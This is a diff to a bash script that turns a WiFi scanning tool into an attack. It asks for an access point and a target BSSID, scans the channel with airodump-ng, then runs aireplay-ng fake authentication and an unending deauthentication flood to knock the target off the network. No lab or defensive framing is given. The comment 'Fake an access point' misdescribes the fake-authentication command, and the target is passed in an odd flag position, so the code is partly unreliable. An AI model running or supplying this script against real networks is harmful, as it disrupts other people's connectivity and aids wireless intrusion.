@@ -62,12 +62,12 @@ iwlist $interface scan 1
 
 
 
-echo "Enter the BSSID you want to attack"
-read ssid
+echo "Enter the BSSID of the access point you want to attack"
+read assid
 
 
 # Exit if BSSID is not valid
-if [ -z "$ssid" ]
+if [ -z "$assid" ]
 then
     echo "BSSID is not valid"
     exit
@@ -86,17 +86,37 @@ then
 fi
 
 
+# Scan the channel of the BSSID
+echo "Scanning channel $channel"
+airodump-ng $interface --bssid $assid --channel $channel
+
+
+
+echo "Enter the BSSID you want to attack"
+read tarssid
+
+
+# Exit if BSSID is not valid
+if [ -z "$tarssid" ]
+then
+    echo "BSSID is not valid"
+    exit
+fi
+
+
+# All this should be written in python using scapy, for now we will use aircrack-ng just to see if it works.
+
+# Fake an access point with assid as BSSID and channel as channel of the AP
+echo "Starting fake access point"
+aireplay-ng -1 0 -a $assid -h $tarssid $interface
 
 
 
 
 
-
-
-
-
-
-
+# Deauthanticate the target
+echo "Deauthing target"
+aireplay-ng -0 0 -a $assid -h $tarssid $interface
 
 
 
